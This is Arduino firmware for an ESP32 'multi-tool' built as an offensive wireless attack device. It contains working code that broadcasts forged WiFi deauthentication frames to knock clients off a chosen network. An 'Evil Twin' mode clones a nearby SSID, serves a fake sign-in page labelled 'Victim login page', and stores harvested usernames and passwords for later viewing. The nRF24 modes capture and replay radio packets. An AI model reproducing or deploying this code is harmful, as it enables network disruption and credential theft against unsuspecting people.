// =============================================================
// ESP32 MULTI-TOOL v2.1
// Each switch enables one mode. BOOT button = short/long press.
//
// SWITCH ASSIGNMENTS (slide left = LOW = ON):
//   D32 → BLE Scanner
//   D33 → WiFi Deauther
//   D34 → Evil Twin AP
//   D35 → nRF24 Capture
//   VP  → nRF24 Replay
//
// BOOT BUTTON (GPIO0, built into board):
//   Short press → scroll / next item
//   Long press  → action (start/stop/fire/rescan/replay)
//
// CREDS PAGE: http://192.168.4.1/creds  (password protected)
// Change CREDS_PASSWORD below before flashing.
// =============================================================

#define CREDS_PASSWORD "changeme123"   // ← change this before flashing

#include <Arduino.h>
#include <Wire.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <RF24.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

// =============================================================
// PINS
// =============================================================
#define OLED_SDA   21
#define OLED_SCL   22
#define NRF_CE      5
#define NRF_CSN    17

#define LED_RED     2
#define LED_BLUE   25
#define LED_GREEN  26
#define LED_YELLOW 27

#define SW_BLE      32
#define SW_DEAUTH   33
#define SW_TWIN     34
#define SW_NRF_CAP  35
#define SW_NRF_REP  36

#define BOOT_BTN    0

// =============================================================
// GLOBALS
// =============================================================
#define SCREEN_W 128
#define SCREEN_H  64

Adafruit_SSD1306 display(SCREEN_W, SCREEN_H, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

enum AppMode {
  MODE_IDLE = 0,
  MODE_BLE_SCAN,
  MODE_DEAUTH,
  MODE_EVIL_TWIN,
  MODE_NRF_CAPTURE,
  MODE_NRF_REPLAY
};

AppMode currentMode = MODE_IDLE;

// =============================================================
// BOOT BUTTON
// =============================================================
unsigned long bootPressTime = 0;
bool          bootHeld      = false;
bool          shortPress    = false;
bool          longPress     = false;
const unsigned long LONG_MS = 600;

void updateBoot() {
  shortPress = false;
  longPress  = false;
  bool pressed = (digitalRead(BOOT_BTN) == LOW);
  if (pressed && !bootHeld) { bootPressTime = millis(); bootHeld = true; }
  if (!pressed && bootHeld) {
    if (millis() - bootPressTime < LONG_MS) shortPress = true;
    bootHeld = false;
  }
  if (bootHeld && millis() - bootPressTime >= LONG_MS) {
    longPress = true; bootHeld = false;
  }
}

// =============================================================
// MODE SELECTION
// =============================================================
AppMode getActiveMode() {
  if (digitalRead(SW_BLE)     == LOW) return MODE_BLE_SCAN;
  if (digitalRead(SW_DEAUTH)  == LOW) return MODE_DEAUTH;
  if (digitalRead(SW_TWIN)    == LOW) return MODE_EVIL_TWIN;
  if (digitalRead(SW_NRF_CAP) == LOW) return MODE_NRF_CAPTURE;
  if (digitalRead(SW_NRF_REP) == LOW) return MODE_NRF_REPLAY;
  return MODE_IDLE;
}

// =============================================================
// OLED HELPERS
// =============================================================
void oledClear() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
}

void oledHeader(const char* title) {
  display.fillRect(0, 0, SCREEN_W, 11, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(2, 2); display.print(title);
  display.setTextColor(SSD1306_WHITE);
}

void oledFooter(const char* hint) {
  display.setCursor(0, 57); display.print(hint);
}

void ledsOff() {
  digitalWrite(LED_RED,    LOW);
  digitalWrite(LED_BLUE,   LOW);
  digitalWrite(LED_GREEN,  LOW);
  digitalWrite(LED_YELLOW, LOW);
}

// =============================================================
// IDLE SCREEN — shows live switch states for debugging
// =============================================================
void drawIdle() {
  oledClear();
  display.setTextSize(1);
  display.setCursor(28, 0); display.print("[ MULTI-TOOL ]");

  // Show each switch state as ON/OFF
  const char* labels[] = { "BLE", "DAUTH", "TWIN", "CAP", "REP" };
  const int   pins[]   = { SW_BLE, SW_DEAUTH, SW_TWIN, SW_NRF_CAP, SW_NRF_REP };

  for (int i = 0; i < 5; i++) {
    int col = (i % 3) * 43;
    int row = 12 + (i / 3) * 18;
    bool on = (digitalRead(pins[i]) == LOW);
    display.setCursor(col, row);
    display.printf("%-5s", labels[i]);
    display.setCursor(col, row + 9);
    if (on) {
      display.fillRect(col, row + 8, 36, 9, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(col + 4, row + 9); display.print(" ON ");
      display.setTextColor(SSD1306_WHITE);
    } else {
      display.print(" off");
    }
  }

  display.setCursor(0, 50);
  display.print("flip switch to activate");
  display.display();
}

// =============================================================
// BLE SCANNER
// Enter: auto-scan
// Short: scroll   Long: rescan
// =============================================================
struct BLEEntry { char mac[18]; char type[8]; int rssi; };
#define MAX_BLE 30
BLEEntry bleList[MAX_BLE];
int      bleCount   = 0;
int      bleScroll  = 0;
bool     bleScanning = false;
BLEScan* bleScan    = nullptr;

class MyBLECB : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    const char* mac = dev.getAddress().toString().c_str();
    for (int i = 0; i < bleCount; i++) {
      if (strcmp(bleList[i].mac, mac) == 0) { bleList[i].rssi = dev.getRSSI(); return; }
    }
    if (bleCount >= MAX_BLE) return;
    BLEEntry& e = bleList[bleCount];
    strncpy(e.mac, mac, 17); e.mac[17] = 0;
    e.rssi = dev.getRSSI();
    strcpy(e.type, "GEN");
    if (dev.haveManufacturerData()) {
      String mfr = dev.getManufacturerData();
      if (mfr.length() >= 2) {
        if ((uint8_t)mfr[0] == 0x4C && (uint8_t)mfr[1] == 0x00) strcpy(e.type, "APPLE");
        if ((uint8_t)mfr[0] == 0x07 && (uint8_t)mfr[1] == 0x01) strcpy(e.type, "TILE");
      }
    }
    if (dev.haveServiceUUID()) {
      String uuid = dev.getServiceUUID().toString();
      if (uuid == "00001812-0000-1000-8000-00805f9b34fb") strcpy(e.type, "HID");
    }
    bleCount++;
    if (strcmp(e.type, "APPLE") == 0) digitalWrite(LED_RED,    HIGH);
    if (strcmp(e.type, "HID")   == 0) digitalWrite(LED_BLUE,   HIGH);
    if (e.rssi > -50)                 digitalWrite(LED_YELLOW,  HIGH);
  }
};

void setupBLE() {
  BLEDevice::init("");
  bleScan = BLEDevice::getScan();
  bleScan->setAdvertisedDeviceCallbacks(new MyBLECB(), true);
  bleScan->setActiveScan(true);
  bleScan->setInterval(100);
  bleScan->setWindow(99);
}

void bleStartScan() {
  ledsOff(); bleCount = 0; bleScroll = 0; bleScanning = true;
  bleScan->start(5, [](BLEScanResults) { bleScanning = false; }, false);
}

void drawBLE() {
  oledClear();
  char hdr[22]; snprintf(hdr, 22, "BLE [%d]%s", bleCount, bleScanning ? " ..." : "");
  oledHeader(hdr);
  if (bleCount == 0) {
    display.setCursor(8, 28);
    display.print(bleScanning ? "Scanning..." : "Long press: rescan");
  } else {
    for (int i = 0; i < 3; i++) {
      int idx = (bleScroll + i) % bleCount;
      display.setCursor(0, 13 + i * 17);
      display.printf("%-5s %4ddBm", bleList[idx].type, bleList[idx].rssi);
      display.setCursor(0, 13 + i * 17 + 8);
      display.print(bleList[idx].mac);
    }
  }
  oledFooter("shrt:scroll  lng:rescan");
  display.display();
}

void handleBLE() {
  if (shortPress && bleCount > 0) bleScroll = (bleScroll + 1) % bleCount;
  if (longPress && !bleScanning)  bleStartScan();
  drawBLE();
}

// =============================================================
// WIFI DEAUTHER — async scan so screen updates immediately
// Enter: start async scan
// Short: next AP   Long: toggle deauth
// =============================================================
struct APEntry { char ssid[33]; uint8_t bssid[6]; int32_t rssi; uint8_t channel; };
#define MAX_APS 20
APEntry apList[MAX_APS];
int     apCount    = 0;
int     apSelected = 0;
bool    deauthing  = false;
bool    wifiReady  = false;
bool    wifiScanning = false;

uint8_t deauthFrame[26] = {
  0xC0,0x00, 0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00,0x00,0x00,0x00,0x00,
  0x00,0x00, 0x07,0x00
};

void initWifi() {
  if (wifiReady) return;
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  wifiReady = true;
}

// Non-blocking: kicks off scan and returns immediately
void startWifiScanAsync() {
  WiFi.mode(WIFI_STA);
  WiFi.scanNetworks(true, true); // async = true
  wifiScanning = true;
  apCount = 0;
}

// Call this in the handler loop — picks up results when ready
void pollWifiScan() {
  if (!wifiScanning) return;
  int n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return;
  if (n > 0) {
    apCount = min(n, MAX_APS);
    for (int i = 0; i < apCount; i++) {
      strlcpy(apList[i].ssid, WiFi.SSID(i).c_str(), 33);
      apList[i].rssi    = WiFi.RSSI(i);
      apList[i].channel = WiFi.channel(i);
      memcpy(apList[i].bssid, WiFi.BSSID(i), 6);
    }
    WiFi.scanDelete();
  }
  esp_wifi_set_mode(WIFI_MODE_APSTA);
  wifiScanning = false;
}

void sendDeauth(int idx) {
  uint8_t* b = apList[idx].bssid;
  memcpy(&deauthFrame[10], b, 6);
  memcpy(&deauthFrame[16], b, 6);
  esp_wifi_set_channel(apList[idx].channel, WIFI_SECOND_CHAN_NONE);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    delayMicroseconds(200);
  }
}

void drawDeauth() {
  oledClear();
  const char* hdr = deauthing ? "DEAUTH [FIRING]" : (wifiScanning ? "DEAUTH [SCAN...]" : "DEAUTH");
  oledHeader(hdr);
  if (apCount == 0) {
    display.setCursor(0, 24);
    display.print(wifiScanning ? "Scanning APs..." : "Long press: rescan");
  } else {
    for (int i = 0; i < 3 && i < apCount; i++) {
      int idx = (apSelected + i) % apCount;
      display.setCursor(0, 13 + i * 16);
      display.printf("%s%.15s", i == 0 ? ">" : " ", apList[idx].ssid);
      display.setCursor(0, 13 + i * 16 + 8);
      display.printf(" ch%d %ddBm", apList[idx].channel, apList[idx].rssi);
    }
  }
  oledFooter("shrt:next  lng:fire/scan");
  display.display();
}

void handleDeauth() {
  pollWifiScan(); // check if async scan finished

  if (shortPress && apCount > 0) {
    deauthing = false; digitalWrite(LED_RED, LOW);
    apSelected = (apSelected + 1) % apCount;
  }
  if (longPress) {
    if (apCount == 0) { startWifiScanAsync(); }
    else { deauthing = !deauthing; digitalWrite(LED_RED, deauthing); }
  }
  if (deauthing && apCount > 0) {
    sendDeauth(apSelected);
    digitalWrite(LED_RED, !digitalRead(LED_RED));
  }
  drawDeauth();
}

// =============================================================
// EVIL TWIN — password protected /creds endpoint
// Enter: show SSID picker
// Short: next SSID   Long: start/stop twin
// Visit http://192.168.4.1/creds while twin is active
// =============================================================
DNSServer  dnsServer;
WebServer  httpServer(80);
bool       twinActive = false;
int        credCount  = 0;
int        twinScroll = 0;
char       twinSSID[33] = "Free_WiFi";
IPAddress  apIP(192, 168, 4, 1);

const char* portalHTML = R"html(
<!DOCTYPE html><html><head>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign In</title>
<style>body{font-family:sans-serif;max-width:380px;margin:50px auto;padding:20px}
input{width:100%;padding:10px;margin:6px 0;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;background:#0066CC;color:#fff;border:none;font-size:16px}
</style></head><body>
<h2>Network Login</h2><p>Sign in to access the internet.</p>
<form method='POST' action='/login'>
<input name='u' placeholder='Email or Username' required>
<input name='p' type='password' placeholder='Password' required>
<button>Connect</button>
</form></body></html>)html";

void startTwin(const char* ssid) {
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
  WiFi.softAP(ssid, "", 6, 0, 4);
  dnsServer.start(53, "*", apIP);

  // Victim login page
  httpServer.on("/", HTTP_GET, [](){ httpServer.send(200, "text/html", portalHTML); });

  // Harvest credentials
  httpServer.on("/login", HTTP_POST, [](){
    String u = httpServer.arg("u"), p = httpServer.arg("p");
    File f = SPIFFS.open("/creds.txt", FILE_APPEND);
    if (f) { f.printf("[%lus] %s : %s\n", millis()/1000, u.c_str(), p.c_str()); f.close(); }
    credCount++;
    digitalWrite(LED_GREEN, HIGH);
    httpServer.sendHeader("Location", "https://www.google.com");
    httpServer.send(302);
  });

  // Password-protected creds viewer — Basic Auth
  // Username: admin   Password: whatever CREDS_PASSWORD is set to
  httpServer.on("/creds", HTTP_GET, [](){
    if (!httpServer.authenticate("admin", CREDS_PASSWORD)) {
      return httpServer.requestAuthentication(BASIC_AUTH, "Multi-Tool", "Access denied.");
    }
    File f = SPIFFS.open("/creds.txt", FILE_READ);
    if (!f || f.size() == 0) {
      httpServer.send(200, "text/plain", "No credentials captured yet.");
      return;
    }
    // Serve as a simple HTML page
    String out = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
                 "<title>Captured Creds</title><style>body{font-family:monospace;padding:20px}"
                 "pre{background:#111;color:#0f0;padding:15px;border-radius:6px}"
                 "h2{color:#333}</style></head><body>"
                 "<h2>Captured Credentials</h2><pre>";
    while (f.available()) out += (char)f.read();
    f.close();
    out += "</pre><br><a href='/creds/clear'>[Clear all]</a></body></html>";
    httpServer.send(200, "text/html", out);
  });

  // Clear creds (also password protected)
  httpServer.on("/creds/clear", HTTP_GET, [](){
    if (!httpServer.authenticate("admin", CREDS_PASSWORD)) {
      return httpServer.requestAuthentication(BASIC_AUTH, "Multi-Tool", "Access denied.");
    }
    SPIFFS.remove("/creds.txt");
    credCount = 0;
    httpServer.send(200, "text/plain", "Cleared.");
  });

  // Catch-all → redirect to portal
  httpServer.onNotFound([](){ httpServer.sendHeader("Location","http://"+apIP.toString()); httpServer.send(302); });

  httpServer.begin();
  twinActive = true;
}

void stopTwin() {
  httpServer.stop(); dnsServer.stop();
  WiFi.softAPdisconnect(true);
  twinActive = false;
}

void drawEvilTwin() {
  oledClear();
  oledHeader(twinActive ? "EVIL TWIN [LIVE]" : "EVIL TWIN");
  if (!twinActive) {
    display.setCursor(0, 13); display.print("Clone SSID:");
    display.setCursor(0, 24);
    if (apCount > 0) display.printf("> %.18s", apList[twinScroll % apCount].ssid);
    else             display.print("> Free_WiFi");
    display.setCursor(0, 38); display.print("shrt:next  lng:launch");
  } else {
    display.setCursor(0, 13); display.printf("SSID: %.18s", twinSSID);
    display.setCursor(0, 25); display.print("IP: 192.168.4.1");
    display.setCursor(0, 37); display.printf("Creds: %d  lng:stop", credCount);
    display.setCursor(0, 49); display.print("/creds (pw protected)");
  }
  display.display();
}

void handleEvilTwin() {
  if (!twinActive) {
    if (shortPress && apCount > 0) twinScroll = (twinScroll + 1) % apCount;
    if (longPress) {
      if (apCount > 0) strlcpy(twinSSID, apList[twinScroll % apCount].ssid, 33);
      SPIFFS.begin(true);
      startTwin(twinSSID);
    }
  } else {
    dnsServer.processNextRequest();
    httpServer.handleClient();
    if (longPress) stopTwin();
  }
  drawEvilTwin();
}

// =============================================================
// nRF24 CAPTURE
// Enter: auto-start capture
// Short: channel +1   Long: clear buffer
// =============================================================
#define MAX_PKTS 10
uint8_t nrfPkts[MAX_PKTS][32];
int     nrfCount  = 0;
int     nrfScroll = 0;
uint8_t nrfChan   = 2;
bool    nrfCapOn  = false;
bool    nrfReady  = false;
const uint64_t PROMISC_ADDR = 0xAAAAAAAAAALL;

void setupNRF() {
  if (!radio.begin()) return;
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_2MBPS);
  radio.setAutoAck(false);
  radio.disableCRC();
  radio.setPayloadSize(32);
  nrfReady = true;
}

void nrfStartCap() {
  radio.setChannel(nrfChan);
  radio.setAddressWidth(2);
  radio.openReadingPipe(1, PROMISC_ADDR);
  radio.startListening();
  nrfCapOn = true;
  digitalWrite(LED_BLUE, HIGH);
}

void nrfStopCap() {
  radio.stopListening();
  nrfCapOn = false;
  digitalWrite(LED_BLUE, LOW);
}

void nrfPoll() {
  if (!nrfCapOn || nrfCount >= MAX_PKTS) return;
  if (radio.available()) {
    radio.read(nrfPkts[nrfCount++], 32);
    digitalWrite(LED_YELLOW, HIGH); delay(40); digitalWrite(LED_YELLOW, LOW);
  }
}

void drawNRFCap() {
  oledClear();
  oledHeader(nrfCapOn ? "nRF24 CAP [ON]" : "nRF24 CAP [OFF]");
  display.setCursor(0, 13);
  display.printf("Ch:%3d  Pkts:%d/%d", nrfChan, nrfCount, MAX_PKTS);
  if (nrfCount > 0) {
    display.setCursor(0, 25); display.print("Last pkt:");
    display.setCursor(0, 35);
    for (int i = 0; i < 8; i++)  display.printf("%02X ", nrfPkts[nrfCount-1][i]);
    display.setCursor(0, 45);
    for (int i = 8; i < 16; i++) display.printf("%02X ", nrfPkts[nrfCount-1][i]);
  } else {
    display.setCursor(0, 32); display.print("Listening...");
  }
  oledFooter("shrt:ch+  lng:clear buf");
  display.display();
}

void handleNRFCapture() {
  if (!nrfReady) {
    oledClear(); oledHeader("nRF24 CAP");
    display.setCursor(0, 25); display.print("nRF24 not found!");
    display.setCursor(0, 37); display.print("Check wiring.");
    display.display(); return;
  }
  if (shortPress) {
    nrfChan = (nrfChan >= 125) ? 0 : nrfChan + 1;
    if (nrfCapOn) { nrfStopCap(); nrfStartCap(); }
  }
  if (longPress) { nrfCount = 0; nrfScroll = 0; }
  nrfPoll();
  drawNRFCap();
}

// =============================================================
// nRF24 REPLAY
// Short: next packet   Long: replay selected
// =============================================================
void nrfReplay(int idx) {
  radio.stopListening();
  radio.setAddressWidth(5);
  radio.openWritingPipe(PROMISC_ADDR);
  radio.setChannel(nrfChan);
  for (int i = 0; i < 5; i++) { radio.write(nrfPkts[idx], 32); delay(8); }
  if (nrfCapOn) radio.startListening();
  digitalWrite(LED_RED, HIGH); delay(100); digitalWrite(LED_RED, LOW);
}

void drawNRFReplay() {
  oledClear();
  oledHeader("nRF24 REPLAY");
  display.setCursor(0, 13);
  display.printf("Ch:%3d  Pkts:%d", nrfChan, nrfCount);
  if (nrfCount == 0) {
    display.setCursor(0, 28); display.print("No packets captured.");
    display.setCursor(0, 40); display.print("Use CAP switch first.");
  } else {
    int idx = nrfScroll % nrfCount;
    display.setCursor(0, 24); display.printf("Pkt #%d:", idx);
    display.setCursor(0, 34);
    for (int i = 0; i < 8; i++)  display.printf("%02X ", nrfPkts[idx][i]);
    display.setCursor(0, 44);
    for (int i = 8; i < 16; i++) display.printf("%02X ", nrfPkts[idx][i]);
  }
  oledFooter("shrt:next  lng:replay");
  display.display();
}

void handleNRFReplay() {
  if (shortPress && nrfCount > 0) nrfScroll = (nrfScroll + 1) % nrfCount;
  if (longPress  && nrfCount > 0) nrfReplay(nrfScroll % nrfCount);
  drawNRFReplay();
}

// =============================================================
// MODE TRANSITIONS
// =============================================================
void onModeEnter(AppMode mode) {
  ledsOff();
  switch (mode) {
    case MODE_IDLE:
      if (twinActive) stopTwin();
      if (nrfCapOn)   nrfStopCap();
      deauthing = false;
      drawIdle();
      break;
    case MODE_BLE_SCAN:
      bleStartScan();
      break;
    case MODE_DEAUTH:
      initWifi();
      apSelected = 0; deauthing = false;
      startWifiScanAsync(); // non-blocking — screen updates immediately
      break;
    case MODE_EVIL_TWIN:
      credCount = 0; twinScroll = 0;
      SPIFFS.begin(true);
      break;
    case MODE_NRF_CAPTURE:
      if (nrfReady) { nrfCount = 0; nrfScroll = 0; nrfStartCap(); }
      break;
    case MODE_NRF_REPLAY:
      nrfScroll = 0;
      break;
  }
}

// =============================================================
// SETUP & LOOP
// =============================================================
void setup() {
  Serial.begin(115200);

  pinMode(LED_RED,    OUTPUT);
  pinMode(LED_BLUE,   OUTPUT);
  pinMode(LED_GREEN,  OUTPUT);
  pinMode(LED_YELLOW, OUTPUT);
  pinMode(SW_BLE,    INPUT_PULLUP);
  pinMode(SW_DEAUTH, INPUT_PULLUP);
  // SW_TWIN(34), SW_NRF_CAP(35), SW_NRF_REP(36) are input-only
  // Right pin of each switch must connect to 3.3V
  pinMode(BOOT_BTN, INPUT_PULLUP);

  Wire.begin(OLED_SDA, OLED_SCL);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("OLED not found"); while (1);
  }

  // Splash
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(18, 8);  display.print("MULTI");
  display.setCursor(14, 28); display.print("-TOOL-");
  display.setTextSize(1);
  display.setCursor(20, 50); display.print("v2.1  ESP32+nRF24");
  display.display();

  for (int i = 0; i < 3; i++) {
    for (int p : {LED_RED, LED_BLUE, LED_GREEN, LED_YELLOW}) {
      digitalWrite(p, HIGH); delay(70); digitalWrite(p, LOW);
    }
  }

  setupBLE();
  setupNRF();
  SPIFFS.begin(true);

  delay(400);
  drawIdle();
}

void loop() {
  AppMode newMode = getActiveMode();
  if (newMode != currentMode) {
    currentMode = newMode;
    onModeEnter(currentMode);
  }

  updateBoot();

  switch (currentMode) {
    case MODE_IDLE:
      // Refresh idle screen every ~500ms to show live switch states
      static unsigned long lastIdle = 0;
      if (millis() - lastIdle > 500) { drawIdle(); lastIdle = millis(); }
      break;
    case MODE_BLE_SCAN:    handleBLE();        break;
    case MODE_DEAUTH:      handleDeauth();     break;
    case MODE_EVIL_TWIN:   handleEvilTwin();   break;
    case MODE_NRF_CAPTURE: handleNRFCapture(); break;
    case MODE_NRF_REPLAY:  handleNRFReplay();  break;
  }
}
